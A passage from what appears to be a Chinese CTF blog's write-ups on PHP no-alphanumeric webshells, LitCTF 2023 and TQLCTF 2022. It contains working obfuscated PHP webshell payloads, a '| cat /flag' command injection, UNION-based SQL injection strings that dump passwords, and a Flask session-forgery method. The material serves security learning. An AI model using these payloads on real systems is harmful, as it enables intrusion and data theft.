掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;;function mb_str_split( $string ) &#123;    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string ); &#125;foreach (mb_str_split($word) as $c)&#123;    $arr[] = $c;&#125;for ($x=0;$x&lt;strlen($shell);$x++)&#123;    for ($y=0;$y&lt;count($arr);$y++)    &#123;        $k = $arr[$y];        if ($shell[$x] == ~($k&#123;1&#125;))        &#123;            $result .= $k;            break;        &#125;    &#125;&#125;echo $result;\n\n这个取反是有点难度的，我们仔细看看\n\n$shell = &quot;assert&quot;;$result = &quot;&quot;;$arr =array();$word\n\n这几个可以当变量，$word太长了我不写了看起来不舒服\nfunction mb_str_split( $string ) &#123;    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string ); &#125;foreach (mb_str_split($word) as $c)&#123;    $arr[] = $c;&#125;\n\n这两个我们放一块看看，前者是一个函数，是一个回溯匹配。其实我是看不懂的，只能看到前半部分有^这个是开头我知道，后者有$是结尾。感觉是对开头结尾进行的操作\n看看chatgpt怎么说\n(?&lt;!^): 这是一个负向回溯断言，用于匹配不在字符串开头的位置。其中 (?&lt;!...) 表示负向回溯断言，^ 表示字符串的开头。因此 (?&lt;!^) 就是匹配不在字符串开头的位置。这个断言的作用是确保只有在两个字符之间的位置才能进行分割。\n(?!$): 这是一个负向预测断言，用于匹配不在字符串结尾的位置。其中 (?!...) 表示负向预测断言，$ 表示字符串的结尾。因此 (?!$) 就是匹配不在字符串结尾的位置。这个断言的作用是确保只有在两个字符之间的位置才能进行分割。\n大概是能理解了\n后面就是对我们的$word的这个字符库进行遍历，赋值给数组。\n为什么后面就知道了\nfor ($x=0;$x&lt;strlen($shell);$x++)&#123;    for ($y=0;$y&lt;count($arr);$y++)    &#123;        $k = $arr[$y];        if ($shell[$x] == ~($k&#123;1&#125;))        &#123;            $result .= $k;            break;        &#125;    &#125;&#125;echo $result;\n\n这里对我们的$shell进行遍历循环，其实思路都是一样的。匹配相等的。我们对\n$shell[$x] &#x3D;&#x3D; ~($k{1})这个进行判断。\n就可以了\n最后出来的结果\n\n还记得之前我们学习的取反知识点吗？\n一个字符可以分成三个字节。\n&lt;?php$_++;   //得到1，此时$_=1$__ = &quot;极&quot;;$___ = ~($__&#123;$_&#125;);   //得到a，此时$___=&quot;a&quot;$__ = &quot;区&quot;;$___ .= ~($__&#123;$_&#125;);   //得到s，此时$___=&quot;as&quot;$___ .= ~($__&#123;$_&#125;);   //此时$___=&quot;ass&quot;$__ = &quot;皮&quot;;$___ .= ~($__&#123;$_&#125;);   //得到e，此时$___=&quot;asse&quot;$__ = &quot;十&quot;;$___ .= ~($__&#123;$_&#125;);   //得到r，此时$___=&quot;asser&quot;$__ = &quot;勺&quot;;$___ .= ~($__&#123;$_&#125;);   //得到t，此时$___=&quot;assert&quot;$____ = &#x27;_&#x27;;   //$____=&#x27;_&#x27;$__ = &quot;寸&quot;;$____ .= ~($__&#123;$_&#125;);   //得到P，此时$____=&quot;_P&quot;$__ = &quot;小&quot;;$____ .= ~($__&#123;$_&#125;);   //得到O，此时$____=&quot;_PO&quot;$__ = &quot;欠&quot;;$____ .= ~($__&#123;$_&#125;);   //得到S，此时$____=&quot;_POS&quot;$__ = &quot;立&quot;;$____ .= ~($__&#123;$_&#125;);   //得到T，此时$____=&quot;_POST&quot;$_ = $$____;   //$_ = $_POST$___($_[_]);   //assert($_POST[_])\n\n\n大概需要理解这个思路和操作\n一个plusdef get(shell):    hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))    hexbit = hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)    print(hexbit)get(&#x27;assert&#x27;)get(&#x27;_POST&#x27;)\n\n首先，map() 函数将传入的 lambda 匿名函数应用到 shell 字符串中的每个字符上。lambda 函数接受一个字符参数 x，并执行以下操作：\n\nord(x)：将字符 x 转换为其对应的 ASCII 码值。\n-(256-ord(x))：将 ASCII 码值减去 256，得到一个负整数。\n~(-(256-ord(x)))：将该负整数按位取反，得到其补码表示的正整数。\nhex(~(-(256-ord(x))))：将该正整数转换为十六进制字符串表示。\n\n因此，map() 函数返回一个字符串列表，其中每个字符串表示 shell 字符串中的一个字符的 URL 编码的十六进制字符串。\n接着，&#39;&#39;.join() 函数将该字符串列表中的所有字符串连接起来，生成一个整个字符串的 URL 编码的十六进制字符串。\n最后，将该字符串中的所有 ‘0x’ 替换为 ‘%’，得到最终的 URL 编码字符串。\n&lt;?php$_ = ~&quot;%9e%8c%8c%9a%8d%8b&quot;;   //得到assert，此时$_=&quot;assert&quot;$__ = ~&quot;%a0%af%b0%ac%ab&quot;;   //得到_POST，此时$__=&quot;_POST&quot;$___ = $$__;   //$___=$_POST$_($___[_]);   //assert($_POST[_])\n\n自增自减&quot;A&quot;++ ==&gt; &quot;B&quot;&quot;B&quot;++ ==&gt; &quot;C&quot;\n\n这个能理解吧\n一个很简单的思想，能得到一个字符，所有字符都可以通过自增自减得到\n根据上面的知识总结，我们看看这道题怎么写\n\n重新看看题目\n测试一下那些字符可以使用\n\n&lt;?phpfor($i=32;$i&lt;127;$i++)&#123;    if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, chr($i))) &#123;        echo chr($i);    &#125;&#125;\n\n可用字符有这些\n$()+,.0123456789;=[]_&#123;&#125;\n\n这里可以有字符我们就利用自增方式来玩\n&lt;?php$__=_.[];   //$__=_Array$_=$__[4];  //$_=a$_++;   //$_=b$_0=++$_;   //$_0=$_=c$_++;   //$_=d$_++;   //$_=e$_++;   //$_=f$_++;   //$_=g$_=$_0.++$_.$__[3];     //$_0=c;++$_=h;$__[3]=r$_=_.$_(71).$_(69).$_(84);  //$_=_.G.E.T=_GET$$_[_]($$_[__]);    //$_GET[_]($_GET[__])?&gt;\n\n$__=_.[];$_=$__[4];$_++;$_0=++$_;$_++;$_++;$_++;$_++;$_=$_0.++$_.$__[3];$_=_.$_(71).$_(69).$_(84);$$_[_]($$_[__]);\n\n注意还有最后一点\npost传参时需要将payload进行urlencode\nget传参 ?_=system&amp;__=ls /\nok\n思路是这样的但是这个payload我不知道为什么不可以\n换一个\n$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);GET?1=system&amp;2=lsPOSTrce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B\n\n\n","categories":["writeups"],"tags":["文件包含","html","无字符rce","文件上传","cookie"]},{"title":"LitCTF-2023","url":"/2023/05/15/LitCTF-2023/","content":"前言LitCTF 2023因为过生日就没有打，这里复现一下，希望不会太过于简单\n[LitCTF 2023]导弹迷踪\n一张图解决\n[LitCTF 2023]Ping这里的过滤是在前端\n\n一句话前端过滤等于没有过滤\n方法一f12加f1禁用javascript\n就可以随便ping 了\n127.0.0.1 | cat &#x2F;flag\n\n方法二\n抓包可以直接绕过前端\n[LitCTF 2023]我Flag呢？\n[LitCTF 2023]1zjs\njs里面有个提示\n\n控制台里面跑一下\n\n结束\n[LitCTF 2023]PHP是世界上最好的语言！！\n没有什么意思\n[LitCTF 2023]Follow me and hack me\n[LitCTF 2023]Vim yydsVim源码泄露\n说明可能存在.swp备份文件，正常URL:xxx&#x2F;index.php则尝试URL:xxx&#x2F;.index.php.swp下载.swp文件代码并使用vim打开，打开命令：vim -r index.php.swp打开后则发现源码，进行代码审计\n\n传参就可以了\n\n[LitCTF 2023]Http pro max plus这题有点意思\n\n一眼xff开始抓包\n\n离谱\n\n换一种 client-ip: 127.0.0.1\n\nreferer\n\n换浏览器\n\n代理\nvia: Clash.win\n\n\nok\n\n也没有flag\n\n\n结束\n[LitCTF 2023]Flag点击就送！伪造session\n\n看看cookie\n\n这里是一个没怎么接触过的知识点，flask的session伪造\nhttps://www.freebuf.com/articles/web/354448.html\n这里有工具可以直接利用\nhttps://github.com/noraj/flask-session-cookie-manager\n原理就是flask框架的session放在客户端，是可以被我们读取的，这里我们需要知道他的secrt——key就可以伪造\n\n这里猜测密码是LitCTF\n\n改session\nok\n[LitCTF 2023]作业管理系统题目环境好像坏了\n[LitCTF 2023]这是什么？SQL ！注一下 ！sql注入\n不断测试\n‘1’))))))这样闭合是合理的\n用#不能用–+\n&#x27;1&#x27;)))))) union select 1,2#&#x27;1&#x27;)))))) union select 1,database()#\n\n\n数据库名\n&#x27;1&#x27;)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;#\n\n\n&#x27;1&#x27;)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#\n\n\n一般在password里面\n1)))))) union select 1,group_concat(password) from ctf.users#\n\n\n感觉被耍了\n\n用sqlmap还跑出来一个数据库\n&#x27;1&#x27;)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;#\n\n\n1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_name=&quot;flag&quot;#\n\n\n一样的\n1)))))) union select 1,group_concat(flag) from ctftraining.flag#\n\n\ntmd\n[LitCTF 2023]就当无事发生\n怪怪的查询github历史\n[LitCTF 2023]彩蛋不写了\n\n","categories":["writeups"],"tags":["文件上传","JS","RCE","前端绕过","jsfuck","信息泄露","flask","git"]},{"title":"TQLCTF2022","url":"/2023/05/16/TQLCTF2022/","content":"前言这个比赛应该很有难度，估计得是完完全全看着wp写，里面的nodejs和DNS污染我是都没有接触过的，试试吧，一起学习一下\n[TQLCTF 2022]simple_bypass这题难度就可见一斑，连入口都没有找到。\n用view-source看源码\n\n这里要敏锐的发现一个文件包含漏洞。\n利用这个读取敏感文件，比如index.php\n\n出来了\n&lt;?phperror_reporting(0);if(isset($_POST[&#x27;user&#x27;]) &amp;&amp; isset($_POST[&#x27;pass&#x27;]))&#123;\t$hash_user = md5($_POST[&#x27;user&#x27;]);\t$hash_pass = &#x27;zsf&#x27;.md5($_POST[&#x27;pass&#x27;]);\tif(isset($_POST[&#x27;punctuation&#x27;]))&#123;\t\t//filter\t\tif (strlen($_POST[&#x27;user&#x27;]) &gt; 6)&#123;\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;);\t\t&#125;\t\telseif(strlen($_POST[&#x27;website&#x27;]) &gt; 25)&#123;\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;);\t\t&#125;\t\telseif(strlen($_POST[&#x27;punctuation&#x27;]) &gt; 1000)&#123;\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;);\t\t&#125;\t\telse&#123;\t\t\tif(preg_match(&#x27;/[^\\w\\/\\(\\)\\*&lt;&gt;]/&#x27;, $_POST[&#x27;user&#x27;]) === 0)&#123;\t\t\t\tif (preg_match(&#x27;/[^\\w\\/\\*:\\.\\;\\(\\)\\n&lt;&gt;]/&#x27;, $_POST[&#x27;website&#x27;]) === 0)&#123;\t\t\t\t\t$_POST[&#x27;punctuation&#x27;] = preg_replace(&quot;/[a-z,A-Z,0-9&gt;\\?]/&quot;,&quot;&quot;,$_POST[&#x27;punctuation&#x27;]);\t\t\t\t\t$template = file_get_contents(&#x27;./template.html&#x27;);\t\t\t\t\t$content = str_replace(&quot;__USER__&quot;, $_POST[&#x27;user&#x27;], $template);\t\t\t\t\t$content = str_replace(&quot;__PASS__&quot;, $hash_pass, $content);\t\t\t\t\t$content = str_replace(&quot;__WEBSITE__&quot;, $_POST[&#x27;website&#x27;], $content);\t\t\t\t\t$content = str_replace(&quot;__PUNC__&quot;, $_POST[&#x27;punctuation&#x27;], $content);\t\t\t\t\tfile_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);\t\t\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;);\t\t\t\t&#125;\t\t\t\telse&#123;\t\t\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;);\t\t\t\t&#125;\t\t\t&#125;\t\t\telse&#123;\t\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;);\t\t\t&#125;\t\t&#125;\t&#125;\telse&#123;\t\tsetcookie(&quot;user&quot;, $_POST[&#x27;user&#x27;], time()+3600);\t\tsetcookie(&quot;pass&quot;, $hash_pass, time()+3600);\t\tHeader(&quot;Location:sandbox/$hash_user.php&quot;);\t&#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; \t&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\t&lt;title&gt;Simple Linux&lt;/title&gt;\t&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/styles.css&quot;&gt;\t&lt;!--[if IE]&gt;\t\t&lt;script src=&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt;\t&lt;![endif]--&gt;&lt;/head&gt;&lt;body&gt;\t&lt;div class=&quot;jq22-container&quot; style=&quot;padding-top:100px&quot;&gt;\t\t&lt;div class=&quot;login-wrap&quot;&gt;\t\t\t&lt;div class=&quot;login-html&quot;&gt;\t\t\t\t&lt;input id=&quot;tab-1&quot; type=&quot;radio&quot; name=&quot;tab&quot; class=&quot;sign-in&quot; checked&gt;&lt;label for=&quot;tab-1&quot; class=&quot;tab&quot;&gt;Sign In&lt;/label&gt;\t\t\t\t&lt;input id=&quot;tab-2&quot; type=&quot;radio&quot; name=&quot;tab&quot; class=&quot;sign-up&quot;&gt;&lt;label for=&quot;tab-2&quot; class=&quot;tab&quot;&gt;Sign Up&lt;/label&gt;\t\t\t\t&lt;div class=&quot;login-form&quot;&gt;\t\t\t\t\t&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;\t\t\t\t\t\t&lt;div class=&quot;sign-in-htm&quot;&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;user&quot; name=&quot;user&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;pass&quot; type=&quot;password&quot; class=&quot;input&quot; data-type=&quot;password&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;!-- &lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;check&quot; type=&quot;checkbox&quot; class=&quot;check&quot; checked&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;check&quot;&gt;&lt;span class=&quot;icon&quot;&gt;&lt;/span&gt; Keep me Signed in&lt;/label&gt;\t\t\t\t\t\t\t&lt;/div&gt; --&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Sign In&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;hr&quot;&gt;&lt;/div&gt;\t\t\t\t\t\t\t&lt;!-- &lt;div class=&quot;foot-lnk&quot;&gt;\t\t\t\t\t\t\t\t&lt;a href=&quot;#forgot&quot;&gt;Forgot Password?&lt;/a&gt;\t\t\t\t\t\t\t&lt;/div&gt; --&gt;\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t&lt;/form&gt;\t\t\t\t\t&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;\t\t\t\t\t\t&lt;div class=&quot;sign-up-htm&quot;&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;user&quot; name=&quot;user&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;pass&quot; type=&quot;password&quot; class=&quot;input&quot; data-type=&quot;password&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Website&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;website&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Punctuation&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;punctuation&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Sign Up&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;hr&quot;&gt;&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;foot-lnk&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;tab-1&quot;&gt;Already Member?&lt;/a&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t&lt;/form&gt;\t\t\t\t&lt;/div&gt;\t\t\t&lt;/div&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;\t&lt;/body&gt;&lt;/html&gt;\n\n得到这样一段源码\n代码审计一下\n这里是登录界面的源代码\n没发现有什么特点。里面有一个template.html\n看看这么长的代码完全不想看，还是得看\n&lt;?php\t\t\terror_reporting(0);\t\t\t$user = ((string)__USER__);\t\t\t$pass = ((string)__PASS__);\t\t\t\t\t\tif(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user &amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;\t\t\t\techo($_COOKIE[&#x27;user&#x27;]);\t\t\t&#125;\t\t\telse&#123;\t\t\t\tdie(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);\t\t\t&#125;\t\t?&gt;\t\t&lt;/li&gt;      &lt;/ul&gt;      &lt;ul class=&quot;item&quot;&gt;        &lt;li&gt;&lt;span class=&quot;sitting_btn&quot;&gt;&lt;/span&gt;系统设置&lt;/li&gt;        &lt;li&gt;&lt;span class=&quot;help_btn&quot;&gt;&lt;/span&gt;使用指南 &lt;b&gt;&lt;/b&gt;&lt;/li&gt;        &lt;li&gt;&lt;span class=&quot;about_btn&quot;&gt;&lt;/span&gt;关于我们&lt;/li&gt;        &lt;li&gt;&lt;span class=&quot;logout_btn&quot;&gt;&lt;/span&gt;退出系统&lt;/li&gt;      &lt;/ul&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;&lt;a href=&quot;#&quot; class=&quot;powered_by&quot;&gt;__PUNC__&lt;/a&gt;&lt;ul id=&quot;deskIcon&quot;&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win5&quot; path=&quot;https://image.baidu.com/&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon4.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;图片      &lt;div class=&quot;right_cron&quot;&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/li&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win6&quot; path=&quot;http://www.4399.com/&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon5.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;游戏      &lt;div class=&quot;right_cron&quot;&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/li&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win10&quot; path=&quot;../get_pic.php?image=img/haokangde.png&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon4.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;&lt;b&gt;好康的&lt;/b&gt;      &lt;div class=&quot;right_cron&quot;&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/li&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win16&quot; path=&quot;__WEBSITE__&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon10.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;&lt;b&gt;你的网站&lt;/b&gt;\n\n看看关键代码\n总结一下，漏洞点永远存在于输入\nuser，website，punctuation这几个，有长度去构造输入的就是punctuation\n\n\n包括过滤方面，也只有_PUNC_过滤的是最少的，只ban掉了字母和数字\n具体怎么输入，只要知道\n\n这里是用了替换的\n等于我们输入的就是会到这个template.html源码里面，emmmm有点乱，就是直接在注册框里面输入，我们就会给其赋值\n利用无字母rce\n这个是很简单的\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);\n\n这时候并不可以直接利用，因为代码执行不在php里面\n所以我们需要去注释\n最终的payload\nuser=1)/*&amp;pass=aa&amp;website=&amp;punctuation=*/;$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);/*\n\n用这个去注册，然后post传_&#x3D;system(命令);\n就可以了\n\n写的很乱，但是都讲到了\n[TQLCTF 2022]SQL TEST真的很烦，很多环境都是坏的\n[TQLCTF 2022]network tools\n这题给了几个工具，都用了一下，没有什么头绪\n\n查了一下，要先学几个前置知识，一个就是DNS\n\n我画了个图，这里就是DNS工作的主要流程，其实就是层层递归\nfrom flask import Flask, request, send_from_directory,sessionfrom flask_session import Sessionfrom io import BytesIOimport reimport osimport ftplibfrom hashlib import md5app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(32)app.config[&#x27;SESSION_TYPE&#x27;] = &#x27;filesystem&#x27;  sess = Session()sess.init_app(app)def exec_command(cmd, addr):    result = &#x27;&#x27;    if re.match(r&#x27;^[a-zA-Z0-9.:-]+$&#x27;, addr) != None:        with os.popen(cmd % (addr)) as readObj:            result = readObj.read()    else:        result = &#x27;Invalid Address!&#x27;    return result@app.route(&quot;/&quot;)def index():    if not session.get(&#x27;token&#x27;):        token = md5(os.urandom(32)).hexdigest()[:8]        session[&#x27;token&#x27;] = token    return send_from_directory(&#x27;&#x27;, &#x27;index.html&#x27;)@app.route(&quot;/ping&quot;, methods=[&#x27;POST&#x27;])def ping():    addr = request.form.get(&#x27;addr&#x27;, &#x27;&#x27;)    if addr == &#x27;&#x27;:        return &#x27;Parameter &quot;addr&quot; Empty!&#x27;    return exec_command(&quot;ping -c 3 -W 1 %s 2&gt;&amp;1&quot;, addr)@app.route(&quot;/traceroute&quot;, methods=[&#x27;POST&#x27;])def traceroute():    addr = request.form.get(&#x27;addr&#x27;, &#x27;&#x27;)    if addr == &#x27;&#x27;:        return &#x27;Parameter &quot;addr&quot; Empty!&#x27;    return exec_command(&quot;traceroute -q 1 -w 1 -n %s 2&gt;&amp;1&quot;, addr)@app.route(&quot;/ftpcheck&quot;)def ftpcheck():    if not session.get(&#x27;token&#x27;):        return redirect(&quot;/&quot;)    domain = session.get(&#x27;token&#x27;) + &quot;.ftp.testsweb.xyz&quot;    file = &#x27;robots.txt&#x27;    fp = BytesIO()    try:        with ftplib.FTP(domain) as ftp:            ftp.login(&quot;admin&quot;,&quot;admin&quot;)            ftp.retrbinary(&#x27;RETR &#x27; + file, fp.write)    except ftplib.all_errors as e:        return &#x27;FTP &#123;&#125; Check Error: &#123;&#125;&#x27;.format(domain,str(e))    fp.seek(0)    try:        with ftplib.FTP(domain) as ftp:            ftp.login(&quot;admin&quot;,&quot;admin&quot;)            ftp.storbinary(&#x27;STOR &#x27; + file, fp)    except ftplib.all_errors as e:        return &#x27;FTP &#123;&#125; Check Error: &#123;&#125;&#x27;.format(domain,str(e))    fp.close()    return &#x27;FTP &#123;&#125; Check Success.&#x27;.format(domain)@app.route(&quot;/shellcheck&quot;, methods=[&#x27;POST&#x27;])def shellcheck():    if request.remote_addr != &#x27;127.0.0.1&#x27;:        return &#x27;Localhost only&#x27;    shell = request.form.get(&#x27;shell&#x27;, &#x27;&#x27;)    if shell == &#x27;&#x27;:        return &#x27;Parameter &quot;shell&quot; Empty!&#x27;    return str(os.system(shell))if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)\n\n思路就出来了\n利用\n@app.route(“&#x2F;shellcheck”, 